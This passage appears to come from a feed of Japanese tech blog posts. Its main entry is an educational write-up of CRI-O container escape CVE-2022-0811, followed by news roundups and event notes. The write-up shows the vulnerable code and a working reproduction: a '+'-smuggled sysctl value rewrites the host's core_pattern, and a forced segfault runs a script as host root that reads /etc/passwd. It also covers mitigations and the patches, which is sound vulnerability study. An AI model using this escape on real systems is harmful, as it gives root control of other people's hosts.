のようなコンテナ内に root cgroup がマウントされたサブシステムはないようです。このため cgroup を新規にマウントしても release_agent は見えず、本脆弱性を悪用することはできません。# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashroot@287fcd93a54f:/# cat /proc/self/cgroup 11:pids:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b010:devices:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b09:hugetlb:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b08:perf_event:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b07:net_cls,net_prio:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b06:blkio:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b05:memory:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b04:cpu,cpuacct:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b03:freezer:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b02:cpuset:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b01:name=systemd:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b0GKE のノードに使われる COS では、デフォルトで AppArmor が有効になっているようです。(https://cloud.google.com/container-optimized-os/docs/how-to/secure-apparmor)$ k run ubuntu --image ubuntu -- sleep 3600pod/ubuntu created$ k exec -it ubuntu -- bashroot@ubuntu:/# cat /proc/self/attr/current cri-containerd.apparmor.d (enforce)root@ubuntu:/# unshare -rmC bashunshare: cannot change root filesystem propagation: Permission denied以上のことから EKS, GKE では本脆弱性の影響はなさそうです。さいごに本脆弱性の調査を通じて、コンテナを構成する Linux の要素技術やコンテナセキュリティへの理解が深まりました。Linux の技術について包括的に学ぶのは（個人的には）難しいので、このような脆弱性の調査から学ぶアプローチも良いのではと思います。本記事が皆さんの学習の糧になれば幸いです。参考リンクCVE-2022-0492https://unit42.paloaltonetworks.jp/cve-2022-0492-cgroups/https://sysdig.jp/blog/detecting-mitigating-cve-2021-0492-sysdig/https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2022/03/06/cve-2022-0492https://nvd.nist.gov/vuln/detail/CVE-2022-0492Linuxhttps://lwn.net/Articles/679786/https://www.nginx.com/blog/what-are-namespaces-cgroups-how-do-they-work/https://linuxhint.com/install-linux-kernel-ubuntu/https://man7.org/linux/man-pages/man7/cgroups.7.htmlhttps://blog.tiqwab.com/2021/11/13/docker-and-cgroups.htmlhttps://en.wikipedia.org/wiki/Seccomphttps://en.wikipedia.org/wiki/Security-Enhanced_Linuxhttps://manpages.ubuntu.com/manpages/xenial/man5/apparmor.d.5.htmlコンテナセキュリティhttps://container-security.dev/security/breakout-to-host.htmlhttps://speakerdeck.com/mochizuki875/container-dev-securityhttps://speakerdeck.com/mochizuki875/container-seccomp","isoDate":"2022-04-06T14:31:50.000Z","dateMiliSeconds":1649255510000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"[2022/04/01] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220401","contentSnippet":"普段は#kubenewsの2022年04月01日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/qNk58ApYjdg 告知とかニュースっぽいもの Kubernetes Meetup Tokyoで登壇しましたhttps:/...","isoDate":"2022-04-01T12:45:40.000Z","dateMiliSeconds":1648817140000,"authorName":"bells17","authorId":"bells17"},{"title":"CVE-2022-0811 調査まとめ","link":"https://kyohmizu.hatenablog.com/entry/2022/03/28/182243","contentSnippet":"CRI-O の脆弱性 (CVE-2022-0811) について調べた内容をまとめました。脆弱性の詳細と、関連する CRI-O の実装や Linux の機能を紹介します。CVE-2022-0811 概要CRI-O についてCRI-O 概要pinns による pod へのカーネルパラメータ設定Coredumpエクスプロイト要点検証回避策修正パッチcommit1commit2containerd の場合さいごに参考リンクCVE-2022-0811 概要CVE-2022-0811 は CRI-O の任意コード実行・コンテナブレイクアウトの脆弱性で、報告した CrowdStrike 社は「cr8escape」と呼んでいます。CRI-O の v1.19 以降に影響があり、すでに修正バージョンがリリースされています。 (詳細は Security Advisory を参照)カーネルパラメータ設定の検証不備により、/proc/sys/kernel/core_pattern への書き込みが可能となっていました。これによりプロセスを異常終了させることでホストの root 権限で任意の操作を行えます。CRI-O についてCRI-O 概要https://github.com/cri-o/cri-oCRI-O は Kubernetes に最適化された軽量な高レベルコンテナランタイムです。CLI ツールは crictl (https://github.com/kubernetes-sigs/cri-tools) を使用します。# cat container-config.json {  \\"metadata\\": {      \\"name\\": \\"ubuntu\\"  },  \\"image\\":{      \\"image\\": \\"ubuntu\\"  },  \\"command\\": [      \\"sleep\\",      \\"3600\\"  ],  \\"log_path\\":\\"ubuntu.0.log\\",  \\"linux\\": {  }}# cat pod-config.json {    \\"metadata\\": {        \\"name\\": \\"ubuntu-sandbox\\",        \\"namespace\\": \\"default\\",        \\"attempt\\": 1,        \\"uid\\": \\"hdishd83fjaiarawuwk28bcsb\\"    },    \\"log_directory\\": \\"/tmp\\",    \\"linux\\": {    }}# crictl runp pod-config.json   ← pod の起動b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc# crictl create b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc container-config.json pod-config.json   ← コンテナ作成2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7# crictl start 2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7   ← コンテナ起動2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7# crictl podsPOD ID              CREATED             STATE               NAME                NAMESPACE           ATTEMPT             RUNTIMEb69761649f8f6       42 seconds ago      Ready               ubuntu-sandbox      default             1                   (default)# crictl psCONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID2ce8010c047df       ubuntu              19 seconds ago      Running             ubuntu              0                   b69761649f8f6pinns による pod へのカーネルパラメータ設定CRI-O は pinns utility を使用することで、pod 起動時にカーネルパラメータ (sysctls) を設定できます。first commit)設定には -s オプションを使用し、key=value の形式で複数のカーネルパラメータを連結して渡すことができます。pinns -s kernel_parameter1=value1+kernel_parameter2=value2設定可能な sysctls は以下の実装で制限されています。https://github.com/cri-o/cri-o/blob/main/pkg/config/sysctl.govar prefixNamespaces = map[string]Namespace{  \\"kernel.shm\\": IpcNamespace,  \\"kernel.msg\\": IpcNamespace,  \\"fs.mqueue.\\": IpcNamespace,  \\"net.\\":       NetNamespace,}// Validate checks that a sysctl is whitelisted because it is known to be// namespaced by the Linux kernel. The parameters hostNet and hostIPC are used// to forbid sysctls for pod sharing the respective namespaces with the host.// This check is only used on sysctls defined by the user in the crio.conf// file.func (s *Sysctl) Validate(hostNet, hostIPC bool) error {  nsErrorFmt := \\"%q not allowed with host %s enabled\\"  if ns, found := namespaces[s.Key()]; found {    if ns == IpcNamespace && hostIPC {      return errors.Errorf(nsErrorFmt, s.Key(), ns)    }    return nil  }  for p, ns := range prefixNamespaces {    if strings.HasPrefix(s.Key(), p) {      if ns == IpcNamespace && hostIPC {        return errors.Errorf(nsErrorFmt, s.Key(), ns)      }      if ns == NetNamespace && hostNet {        return errors.Errorf(nsErrorFmt, s.Key(), ns)      }      return nil    }  }  return errors.Errorf(\\"%s not whitelisted\\", s.Key())}sysctls の適用は pinns 内に実装されており、-s オプションの設定値をもとに /proc/sys/ 以下のファイルに書き込みを行なっています。https://github.com/cri-o/cri-o/blob/main/pinns/src/sysctl.cstatic int write_sysctl_to_file (char * sysctl_key, char* sysctl_value){  if (!sysctl_key || !sysctl_value)  {    pwarn (\\"sysctl key or value not initialized\\");    return -1;  }  // replace periods with / to create the sysctl path  for (char* it = sysctl_key; *it; it++)    if (*it == \'.\')      *it = \'/\';  _cleanup_close_ int dirfd = open (\\"/proc/sys\\", O_DIRECTORY | O_PATH | O_CLOEXEC);  if (UNLIKELY (dirfd < 0))  {    pwarn (\\"failed to open /proc/sys\\");    return -1;  }  _cleanup_close_ int fd = openat (dirfd, sysctl_key, O_WRONLY);  if (UNLIKELY (fd < 0))  {    pwarnf (\\"failed to open /proc/sys/%s\\", sysctl_key);    return -1;  }  int ret = TEMP_FAILURE_RETRY (write (fd, sysctl_value, strlen (sysctl_value)));  if (UNLIKELY (ret < 0))  {    pwarnf (\\"failed to write to /proc/sys/%s\\", sysctl_key);    return -1;  }  return 0;}Coredumpプロセスが異常終了した時に、プロセスメモリの dump を core ファイルとして出力します。Coredump の設定は /proc/sys/kernel/core_pattern に書かれており、ファイルの直接編集や sysctl コマンドで設定を変更できます。# sysctl -w kernel.core_pattern=\\"%e-%s.core\\"kernel.core_pattern には dump の出力先パスを指定しますが、最初文字がパイプ | の場合は指定パスのプログラムを実行します (この場合 dump は標準入力として渡される)。/proc/sys/kernel/core_pattern のデフォルト値として、ubuntu (20.04) では apport というバグレポートツールが指定されています。$ cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %Eまた Coredump のファイルサイズ上限は ulimit で設定します。脆弱性は Soft Limit が0でも刺さりそうです。# cat /proc/self/limits Limit                     Soft Limit           Hard Limit           Units     Max cpu time              unlimited            unlimited            seconds   Max file size             unlimited            unlimited            bytes     Max data size             unlimited            unlimited            bytes     Max stack size            8388608              unlimited            bytes     Max core file size        0                    unlimited            bytes     Max resident set          unlimited            unlimited            bytes     Max processes             3819                 3819                 processes Max open files            1024                 1048576              files     Max locked memory         67108864             67108864             bytes     Max address space         unlimited            unlimited            bytes     Max file locks            unlimited            unlimited            locks     Max pending signals       3819                 3819                 signals   Max msgqueue size         819200               819200               bytes     Max nice priority         0                    0                    Max realtime priority     0                    0                    Max realtime timeout      unlimited            unlimited            usエクスプロイト要点kernel.core_pattern は Namespaced ではないため、ホストとコンテナで同じファイルを参照するコンテナ内からは変更不可pod 起動時に sysctl に kernel.core_pattern を設定できれば、ホストの値も変更できるCIO-O 内で sysctl のキーを検証しているが、value に + を含む文字列を渡すことでバイパス可能 (以下コードを参照)設定後にプロセスを異常終了させることで、ホストの root 権限で任意コード実行問題となったコードfunc getSysctlForPinns(sysctls map[string]string) string {  // this assumes there\'s no sysctl with a `+` in it  const pinnsSysctlDelim = \\"+\\"  g := new(bytes.Buffer)  for key, value := range sysctls {    fmt.Fprintf(g, \\"\'%s=%s\'%s\\", key, value, pinnsSysctlDelim)  // ← \\"\'key1=value1\'+\'key2=value2\'\\" の形で文字列連結する  }  return strings.TrimSuffix(g.String(), pinnsSysctlDelim)}検証脆弱なバージョンの CRI-O で CVE-2022-0811 を検証します。Kubernetes は使用せず、crictl での検証を行いました。# crio --versioncrio version 1.23.1Version:          1.23.1GitCommit:        af642cdafed31e4be5dd82e996bb084050c8bb89GitTreeState:     dirtyBuildDate:        1980-01-01T00:00:00ZGoVersion:        go1.17.4Compiler:         gcPlatform:         linux/amd64Linkmode:         staticBuildTags:        apparmor, exclude_graphdriver_devicemapper, seccomp, selinuxSeccompEnabled:   trueAppArmorEnabled:  true最初にホストに実行させたいプログラムを配置するコンテナを作成します。json、pod-config.json は前述のファイルと同じものです。# crictl runp pod-config.json d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a# crictl create d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a container-config.json pod-config.json 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123# crictl start 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac61239029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123起動したコンテナにアタッチし、コンテナの root パスにプログラムを配置します。/etc/passwd をコンテナ内の /output に出力するスクリプトを用意しました。# crictl exec -it 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123 bashroot@d33614f0b22d:/# mount | grep overlayoverlay on / type overlay (rw,relatime,lowerdir=/var/lib/containers/storage/overlay/l/73PSGHB33J2RBZXIUVK7SRC4UA,upperdir=/var/lib/containers/storageoverlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff,workdir=/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/work,metacopy=on,volatile)root@d33614f0b22d:/# echo \'#!/bin/sh\' > /cmdroot@d33614f0b22d:/# echo \'cat /etc/passwd > /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/output\' >> cmdroot@d33614f0b22d:/# cat /cmd#!/bin/shcat /etc/passwd > /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/outputroot@d33614f0b22d:/# chmod a+x /cmd続いて kernel.core_pattern を変更する pod を作成します。+ で連結した value を記載します。value に記載する kernel.core_pattern には、ホストから見たプログラムの絶対パスを指定しています。# をつけていますが、これは CRI-O の実装で付与されるシングルクォートを無効化する役割があります。# cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %E# cat pod-config2.json {    \\"metadata\\": {        \\"name\\": \\"ubuntu-sandbox2\\",        \\"namespace\\": \\"default\\",        \\"attempt\\": 1,        \\"uid\\": \\"edishd83djaidwnduwk28bcsd\\"    },    \\"log_directory\\": \\"/tmp\\",    \\"linux\\": {  \\"sysctls\\": {      \\"kernel.shm_rmid_forced\\": \\"1+kernel.core_pattern=|/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #\\"  }    }}# crictl runp pod-config2.json FATA[0001] run pod sandbox: rpc error: code = Unknown desc = container create failed: write to /proc/sys/kernel/shm_rmid_forced: Invalid argument pod 作成はエラーになりますが、kernel.core_pattern を見ると変更されていることがわかります。# cat /proc/sys/kernel/core_pattern |/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #\'最後に起動中のコンテナ内でプロセスを異常終了させることで、 Coredump の機能を呼び出しホストの root 権限でプログラムを実行させることができます。root@d33614f0b22d:/# tail -f /dev/null &[1] 17root@d33614f0b22d:/# ps    PID TTY          TIME CMD      4 pts/0    00:00:00 bash     17 pts/0    00:00:00 tail     18 pts/0    00:00:00 psroot@d33614f0b22d:/# kill -SIGSEGV 17root@d33614f0b22d:/# ls /bin  boot  cmd  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  output  proc  root  run  sbin  srv  sys  tmp  usr  var[1]+  Segmentation fault      (core dumped) tail -f /dev/nullroot@d33614f0b22d:/# cat /output root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin...回避策CrowdStrike 社のブログ を参考にしています。CRI-O のアップデート (非推奨だが v1.18 以下へのダウングレードも可)OPA 等のポリシーを設定するPSP で sysctls を全てブロックするpinns の -s を除去するラッパーを用意し、crio.conf の pinns_path に設定する修正パッチcommit1https://github.com/cri-o/cri-o/commit/05c443b06356c2dbf9d30060f362279c6b8ac1a1pinns の -s オプションを生成する箇所で、+ に対してバリデーションを追加しています。  func (mgr *NamespaceManager) NewPodNamespaces(cfg *PodNamespacesConfig) ([]Namespace, error) {    ...      if len(cfg.Sysctls) != 0 {-     pinnsArgs = append(pinnsArgs, \\"-s\\", getSysctlForPinns(cfg.Sysctls))+     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)+     if err != nil {+       return nil, errors.Wrapf(err, \\"invalid sysctl\\")+     }+     pinnsArgs = append(pinnsArgs, \\"-s\\", pinnsSysctls)    }      ...  }- func getSysctlForPinns(sysctls map[string]string) string {-   // this assumes there\'s no sysctl with a `+` in it+ func getSysctlForPinns(sysctls map[string]string) (string, error) {+   // This assumes there\'s no valid sysctl value with a `+` in it+   // and as such errors if one is found.    const pinnsSysctlDelim = \\"+\\"    g := new(bytes.Buffer)    for key, value := range sysctls {+     if strings.Contains(key, pinnsSysctlDelim) || strings.Contains(value, pinnsSysctlDelim) {+       return \\"\\", errors.Errorf(\\"\'%s=%s\' is invalid: %s found yet should not be present\\", key, value, pinnsSysctlDelim)+     }      fmt.Fprintf(g, \\"\'%s=%s\'%s\\", key, value, pinnsSysctlDelim)    }-   return strings.TrimSuffix(g.String(), pinnsSysctlDelim)+   return strings.TrimSuffix(g.String(), pinnsSysctlDelim), nil  }commit2https://github.com/cri-o/cri-o/commit/1af1f8af2c7e23525102dffbf0899b69e34ed3d2文字列の連結をやめ、-s をパラメータ毎に設定する修正がされています。  func (mgr *NamespaceManager) NewPodNamespaces(cfg *PodNamespacesConfig) ([]Namespace, error) {    ...  -   if len(cfg.Sysctls) != 0 {-     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)-     if err != nil {-       return nil, errors.Wrapf(err, \\"invalid sysctl\\")-     }-     pinnsArgs = append(pinnsArgs, \\"-s\\", pinnsSysctls)+   for key, value := range cfg.Sysctls {+     pinnsArgs = append(pinnsArgs, \\"-s\\", fmt.Sprintf(\\"%s=%s\\", key, value))    }      ...  }containerd の場合他のコンテナランタイムがどうなっているか気になったので、containerd の実装を調べてみました。https://github.com/opencontainers/runc/blob/main/libcontainer/configs/validate/validator.go// sysctl validates that the specified sysctl keys are valid or not.// /proc/sys isn\'t completely namespaced and depending on which namespaces// are specified, a subset of sysctls are permitted.func (v *ConfigValidator) sysctl(config *configs.Config) error {    validSysctlMap := map[string]bool{        \\"kernel.msgmax\\":          true,        \\"kernel.msgmnb\\":          true,        \\"kernel.msgmni\\":          true,        \\"kernel.sem\\":             true,        \\"kernel.shmall\\":          true,        \\"kernel.shmmax\\":          true,        \\"kernel.shmmni\\":          true,        \\"kernel.shm_rmid_forced\\": true,    }    for s := range config.Sysctl {        if validSysctlMap[s] || strings.HasPrefix(s, \\"fs.mqueue.\\") {            if config.Namespaces.Contains(configs.NEWIPC) {                continue            } else {                return fmt.Errorf(\\"sysctl %q is not allowed in the hosts ipc namespace\\", s)            }        }        if strings.HasPrefix(s, \\"net.\\") {            if config.Namespaces.Contains(configs.NEWNET) {                continue            } else {                return fmt.Errorf(\\"sysctl %q is not allowed in the hosts network namespace\\", s)            }        }        return fmt.Errorf(\\"sysctl %q is not in a separate kernel namespace\\", s)    }    return nil}CRI-O は pinns により独自の sysctls 設定を実装していますが、pod 作成時に設定する都合上、 OCI の機能を使わない方法を選んだのかもしれません (根拠はないです)。さいごに初めて CRI-O を触りましたが、Docker や containerd とはかなり仕組みが異なることがわかりました。脆弱性の調査を通して CRI-O の実装や Linux の機能に触れることができ、良い機会を得られたと思います。内容に誤りが含まれる可能性がありますので、何かお気づきの方はご指摘等よろしくお願いします。参考リンクhttps://nvd.nist.gov/vuln/detail/CVE-2022-0811https://blog.aquasec.com/cve-2022-0811-cri-o-vulnerabilityhttps://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/https://github.com/cri-o/cri-o/security/advisories/GHSA-6x2m-w449-qwx7https://pwning.systems/posts/escaping-containers-for-fun/https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mountshttps://valinux.hatenablog.com/entry/20210721https://qiita.com/rarul/items/d33b664c8414f065e65ehttps://man7.org/linux/man-pages/man5/core.5.htmlhttps://lwn.net/Articles/280959/https://wiki.ubuntu.com/Apport","isoDate":"2022-03-28T09:22:43.000Z","dateMiliSeconds":1648459363000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"nnn(Terminal file manager)を使ってみる","link":"https://zenn.dev/tayusa/articles/1f87e798ccbed0","contentSnippet":"nnnとはhttps://github.com/jarun/nnnターミナル上で動作するファイルマネージャー 良い点軽量で高速な動作を保つために機能をプラグインとして外出しして拡張できる設計になってますプラグインはシェルスクリプトなどで簡単に記述できますキーバインドはviライクですtmuxを利用してる状態の画像表示も問題ないですターミナルはkittyを利用しています インストールUbuntu$ sudo apt install nnnArch Linux$ sudo pacman -S nnnMacOS$ bre...","isoDate":"2022-03-27T13:27:45.000Z","dateMiliSeconds":1648387665000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"[2022/03/25] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220325","contentSnippet":"普段は#kubenewsの2022年03月25日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/NewvQB5q-QU 告知とかニュースっぽいもの Cloud Native Database Meetup #4https:...","isoDate":"2022-03-25T12:55:35.000Z","dateMiliSeconds":1648212935000,"authorName":"bells17","authorId":"bells17"},{"title":"[2022/03/18] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220318","contentSnippet":"普段は#kubenewsの2022年03月18日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/y7DMp3aqCFM 告知とかニュースっぽいもの 3-shake SRE Tech Talk #3https://youtu...","isoDate":"2022-03-18T12:50:45.000Z","dateMiliSeconds":1647607845000,"authorName":"bells17","authorId":"bells17"},{"title":"脆弱性に学ぶコンテナセキュリティ","link":"https://speakerdeck.com/kyohmizu/cui-ruo-xing-nixue-bukontenasekiyuritei","contentSnippet":"3-shake SRE Tech Talk #3 の登壇資料です。\\rhttps://3-shake.connpass.com/event/241284/","isoDate":"2022-03-18T04:00:00.000Z","dateMiliSeconds":1647576000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Observability Conference 2022 に登壇しました","link":"https://zenn.dev/nwiizo/articles/d837b78914de23","contentSnippet":"「Dapr の概念と実装から学ぶ Observability への招待」 というタイトルで登壇します。https://event.cloudnativedays.jp/o11y2022/talks/1382:embed:cite セッション概要Dapr は CloudNative な技術を背景に持つ分散アプリケーションランタイムです。本セッションでは Dapr の Observability に関する各種機能と、その実装について解説していきます。さらにスリーシェイクの Dapr と Observability への取り組みに関してもご紹介します。Dapr の機能でカバーできる点...","isoDate":"2022-03-11T04:02:18.000Z","dateMiliSeconds":1646971338000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"[2022/03/04] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220304","contentSnippet":"普段は#kubenewsの2022年03月04日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/3s0T6k24I_o 告知とかニュースっぽいもの Twitterコミュニティ機能についてhttps://twitter.co...","isoDate":"2022-03-04T12:34:50.000Z","dateMiliSeconds":1646397290000,"authorName":"bells17","authorId":"bells17"},{"title":"Twitterを用いたラジオ番組圧縮手法の提案","link":"https://speakerdeck.com/ota1022/twitterwoyong-itaraziofan-zu-ya-suo-shou-fa-noti-an","contentSnippet":"DEIM2022 C21-2(day2 p13)にて発表したスライドです。\\rhttps://event.dbsj.org/deim2022/\\r学生プレゼンテーション賞\\rhttps://event.dbsj.org/deim2022/post/awards.html","isoDate":"2022-02-28T05:00:00.000Z","dateMiliSeconds":1646024400000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"JAWS-UG SRE支部 #2 突撃！となりのSRE","link":"https://blog.masasuzu.net/entry/2022/02/26/012602","contentSnippet":"jawsug-sre.connpass.com聞いてきましたのでメモと感想を残しておきます。LTマネーフォーワードのマイクロサービス基盤のこれまでとこれから by マネーフォワード @grezarjpマネーフォワードのマイクロサービス基盤の移り変わりの紹介。中央集権構造 => 権限移譲フェーズ => これから中央集権構造サービスごとに開発チームが存在、サービスにまたがってインフラチームが存在開発チームはインフラを気にしなくてもすんだ。メンバーが少ないうちはなんとかなった組織の規模に対してインフラチームがスケールしなくなった責務の分解点を再定義 DevOpsへ権限移譲フェーズ開発チームに権限を渡していくAWSとKubernatesを使用ランタイム、ミドルウェアも開発チームが管理サービスごとにNamespaceを切る、Namespace内で開発チームは権限を持つマイクロサービスごとにAWSアカウント管理して、リソースを管理するこれから権限は渡したが、運用まではむつかしい開発の運用を負荷を下げるためにTerraformのモジュール化、設定のバリデーションの整備AWSアカウントの統制、コスト可視化を進めたいアプリケーションランタイムのSnadbox化特殊要件なアプリケーションで使えるように開発チームにここまでインフラの権限を渡せて、運用できるのはすごいなと思った。QAQ: 開発チームの権限移譲の苦労、運用面、技術面A: マルチアカウントをつかって 技術上の考慮点があった人と人とのかかわりに関しては銀の弾丸はないので、地道な作業が必要ドキュメントとかで監視項目を揃えてあげるのに力を入れたQ: 開発とインフラでスキルセットの違いはあった?A:インフラはアプリをあんまり見てこなかったのでそのへんのギャップはあったQ: EKSのテナント分割の単位A: 権限分類と障害の影響範囲の最小化はシングルテナントが有利とは言われるが運用負荷を下げるためにマルチテナントを選んだSREグループのマネージャーという立場になって真っ先にやったこと by ミクシィ@isaoshimizu内容に関しては、スライドに詳しく書いてあるので参照。SREのミッション・バリューいいなあと思った。うちのチームでもちゃんと考えたい。SRE Lounge #13 LTでも今回と近いことを書いてるので参照してほしいとのこと↓組織にSREの文化を作り上げていくEnabling SRE | Money Forward Engineers\' BlogQAQ: SRE主導でやるべきではなかったことA: SREは万能な人がおおくでできてしまう開発側のリソースが足りなくて急がないといけないことをSREがやってしまう本来はそうじゃないよねって話自分としては、SREでも開発分野でも巻き取れることはやってしまってもいいと思うんですよね。線を引きすぎるとセクショナリズムになってあまり良くない気がしてる。組織のあり方はそれぞれで、コンテキスト分かってないので、言い切ることはできないですが。Containerサービス と Toil と by スリーシェイク \xa0@tt0603ECSとEKSについてToilと紐付けての話題。Toilの削減ステップ特定計測削減ただこのプロセスはつらい。SREとしては長期的なエンジニアリング に時間を使いたい。本質的なことをすることが目的。Toilを削減することが目的ではない。技術選定として、まずマネージドで考える。チームとして何を大事にしているかを考える。自分たちの”サイズ”で技術選定をして価値あるエンジニアリングをする。個人的にはEKSとECSのまとめがわかりやすくてよかった。QAQ: セルフホステッドを選択する場合は?A: 監視するとき Prometheus使うときとかつらいのでFargateは起動が遅い スケールが遅い技術選定において、自分たちの「サイズ」っていう要素が存在するというのは暗黙的なものになりがちなので、ちゃんと具体的に捉えておくの大事な気がした。 #jawsug_sre— Tomoya Kitaura (@kitta0108) 2022年2月25日  先程はパッと答えられませんでしたが、弊社の場合はMicroServiceを運用する際にはIstioを利用するケースが非常に多く、現状では対応していないため、EKSの場合はSelf Hostedを利用するケースが多いですー#jawsug_sre— TakuyaTezuka@3-shake (@tt0603) 2022年2月25日  パネルディスカッションMFのSREの組織のやり方で工夫してるところもともと中央集権的だった、開発に権限移譲していった権限を渡していっていながらそれ以上にプロダクトが開発が増えてしまったので負荷が増えてしまったenabling SREを広げる役割もつくるSREというポジションじゃなくてもSRE的な動きができるように組織にSREの文化を作り上げていくEnabling SRE | Money Forward Engineers\' Blog技術支援からSREの組織変数がいくつか システムの規模 性質 組織規模、レベル感などpure sreではじめて権限移譲していく自分たちのサイズに合わせて組織を作っていく開発とSREのベストの距離感タイミングによって違う固定されたものじゃない構成をいかにシンプルにできるかが大事SREが開発に使いやすいサービスを提供するSREのAPIを提供するので好きに使って的な横断組織SREと開発チーム内SREというパターンもあるお互いのコミュニケーションは大事採用する際に求めるスキルセットやレベル感なんでもかんでも能力を持ってる人はいない。特定の領域に得意を持ってるといい、最低限のレベル感はほしいコミュニケーション 大事 